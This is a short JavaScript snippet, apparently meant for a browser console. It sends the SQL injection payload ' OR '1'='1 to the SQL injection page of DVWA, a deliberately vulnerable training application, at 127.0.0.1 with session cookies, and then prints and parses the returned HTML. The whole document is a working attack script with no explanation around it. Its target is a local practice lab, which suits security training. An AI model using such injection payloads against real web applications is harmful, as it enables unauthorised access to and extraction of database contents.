(async function() {
  console.log("Starting manual SQL injection...");

  const sqlPayload = "' OR '1'='1";  // classic SQLi

  // Build the URL manually
  const targetUrl = "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=" + encodeURIComponent(sqlPayload) + "&Submit=Submit";

  try {
    const response = await fetch(targetUrl, {
      method: 'GET',
      credentials: 'include'  // needed to send cookies/session
    });

    const html = await response.text();
    console.log("Response received:");
    console.log(html);

    // Optional: parse and extract only the interesting parts
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');
    const result = doc.querySelector('pre, .vulnerable_code_area, #main_body'); // tweak as needed
    if (result) {
      console.log("Extracted result:", result.textContent);
    } else {
      console.log("Could not find specific result element.");
    }
  } catch (error) {
    console.error("Fetch failed:", error);
  }
})();
